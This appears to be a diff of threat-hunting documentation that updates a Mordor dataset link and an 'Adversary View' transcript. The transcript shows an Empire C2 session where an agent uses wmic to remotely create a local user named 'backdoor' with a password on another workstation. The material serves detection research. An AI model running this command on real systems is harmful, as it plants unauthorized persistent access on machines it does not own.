@@ -806,7 +806,7 @@
 <td class="text-align:left"><p>[None]</p></td>
 </tr>
 <tr class="row-even"><td class="text-align:left"><p>Dataset</p></td>
-<td class="text-align:left"><p>https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/empire_wmic_add_user.tar.gz</p></td>
+<td class="text-align:left"><p>https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/empire_wmic_add_user_backdoor.zip</p></td>
 </tr>
 <tr class="row-odd"><td class="text-align:left"><p>References</p></td>
 <td class="text-align:left"><p>None</p></td>
@@ -820,23 +820,43 @@
 </div>
 <div class="section" id="adversary-view">
 <h2>Adversary View<a class="headerlink" href="#adversary-view" title="Permalink to this headline">¶</a></h2>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">V6W3TH8Y</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">shell</span> <span class="n">wmic</span> <span class="o">/</span><span class="n">node</span><span class="p">:</span><span class="n">IT001</span> <span class="n">process</span> <span class="n">call</span> <span class="n">create</span> <span class="s2">&quot;net user /add backdoor pa$$w0rd1&quot;</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Tasked</span> <span class="n">V6W3TH8Y</span> <span class="n">to</span> <span class="n">run</span> <span class="n">TASK_SHELL</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Agent</span> <span class="n">V6W3TH8Y</span> <span class="n">tasked</span> <span class="k">with</span> <span class="n">task</span> <span class="n">ID</span> <span class="mi">12</span>
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">V6W3TH8Y</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">Executing</span> <span class="p">(</span><span class="n">Win32_Process</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">Create</span><span class="p">()</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">agents</span><span class="p">)</span> <span class="o">&gt;</span> 
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">POWERSHELL</span> <span class="n">stager</span> <span class="p">(</span><span class="n">stage</span> <span class="mi">1</span><span class="p">)</span> <span class="n">to</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.5</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">New</span> <span class="n">agent</span> <span class="mi">6</span><span class="n">Z78CY25</span> <span class="n">checked</span> <span class="ow">in</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Initial</span> <span class="n">agent</span> <span class="mi">6</span><span class="n">Z78CY25</span> <span class="kn">from</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.5</span> <span class="n">now</span> <span class="n">active</span> <span class="p">(</span><span class="n">Slack</span><span class="p">)</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">agent</span> <span class="p">(</span><span class="n">stage</span> <span class="mi">2</span><span class="p">)</span> <span class="n">to</span> <span class="mi">6</span><span class="n">Z78CY25</span> <span class="n">at</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.5</span>
+<span class="n">agents</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Active</span> <span class="n">agents</span><span class="p">:</span>
+
+<span class="n">Name</span>     <span class="n">La</span> <span class="n">Internal</span> <span class="n">IP</span>     <span class="n">Machine</span> <span class="n">Name</span>      <span class="n">Username</span>                <span class="n">Process</span>            <span class="n">PID</span>    <span class="n">Delay</span>    <span class="n">Last</span> <span class="n">Seen</span>            <span class="n">Listener</span>
+<span class="o">----</span>     <span class="o">--</span> <span class="o">-----------</span>     <span class="o">------------</span>      <span class="o">--------</span>                <span class="o">-------</span>            <span class="o">---</span>    <span class="o">-----</span>    <span class="o">---------</span>            <span class="o">----------------</span>
+<span class="n">KFL6CMNZ</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.5</span>     <span class="n">WORKSTATION5</span>      <span class="o">*</span><span class="n">THESHIRE</span>\<span class="n">pgustavo</span>      <span class="n">powershell</span>         <span class="mi">7584</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2020</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">14</span> <span class="mi">11</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">59</span>  <span class="n">http</span>            
+<span class="n">YGBLW8EM</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.5</span>     <span class="n">WORKSTATION5</span>      <span class="o">*</span><span class="n">THESHIRE</span>\<span class="n">wardog</span>        <span class="n">powershell</span>         <span class="mi">8924</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2020</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">14</span> <span class="mi">11</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">53</span>  <span class="n">http</span>            
+<span class="n">UBCKLYFA</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.5</span>     <span class="n">WORKSTATION5</span>      <span class="o">*</span><span class="n">THESHIRE</span>\<span class="n">pgustavo</span>      <span class="n">powershell</span>         <span class="mi">5412</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2020</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">14</span> <span class="mi">11</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">16</span>  <span class="n">http</span>            
+
+<span class="mi">6</span><span class="n">Z78CY25</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.5</span>     <span class="n">WORKSTATION5</span>      <span class="o">*</span><span class="n">THESHIRE</span>\<span class="n">pgustavo</span>      <span class="n">powershell</span>         <span class="mi">9564</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2020</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">14</span> <span class="mi">12</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mi">08</span>  <span class="n">http</span>            
+
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">agents</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">interact</span> <span class="mi">6</span><span class="n">Z78CY25</span>
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="mi">6</span><span class="n">Z78CY25</span><span class="p">)</span> <span class="o">&gt;</span> 
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="mi">6</span><span class="n">Z78CY25</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">shell</span> <span class="n">wmic</span> <span class="o">/</span><span class="n">node</span><span class="p">:</span><span class="n">WORKSTATION6</span> <span class="n">process</span> <span class="n">call</span> <span class="n">create</span> <span class="s2">&quot;net user /add backdoor pa$$w0rd1&quot;</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Tasked</span> <span class="mi">6</span><span class="n">Z78CY25</span> <span class="n">to</span> <span class="n">run</span> <span class="n">TASK_SHELL</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Agent</span> <span class="mi">6</span><span class="n">Z78CY25</span> <span class="n">tasked</span> <span class="k">with</span> <span class="n">task</span> <span class="n">ID</span> <span class="mi">1</span>
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="mi">6</span><span class="n">Z78CY25</span><span class="p">)</span> <span class="o">&gt;</span> 
+<span class="n">Executing</span> <span class="p">(</span><span class="n">Win32_Process</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">Create</span><span class="p">()</span>
 
 <span class="n">Method</span> <span class="n">execution</span> <span class="n">successful</span><span class="o">.</span>
 
 <span class="n">Out</span> <span class="n">Parameters</span><span class="p">:</span>
 <span class="n">instance</span> <span class="n">of</span> <span class="n">__PARAMETERS</span>
 <span class="p">{</span>
-  <span class="n">ProcessId</span> <span class="o">=</span> <span class="mi">6580</span><span class="p">;</span>
+  <span class="n">ProcessId</span> <span class="o">=</span> <span class="mi">7768</span><span class="p">;</span>
   <span class="n">ReturnValue</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">};</span>
 
 <span class="o">..</span><span class="n">Command</span> <span class="n">execution</span> <span class="n">completed</span><span class="o">.</span>
 
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">V6W3TH8Y</span><span class="p">)</span> <span class="o">&gt;</span>
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="mi">6</span><span class="n">Z78CY25</span><span class="p">)</span> <span class="o">&gt;</span>
 </pre></div>
 </div>
 </div>
@@ -857,7 +877,7 @@
 <h3>Download &amp; Process Mordor File<a class="headerlink" href="#download-process-mordor-file" title="Permalink to this headline">¶</a></h3>
 <div class="cell docutils container">
 <div class="cell_input docutils container">
-<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/empire_wmic_add_user.tar.gz&quot;</span>
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/empire_wmic_add_user_backdoor.zip&quot;</span>
 <span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
 </pre></div>
 </div>
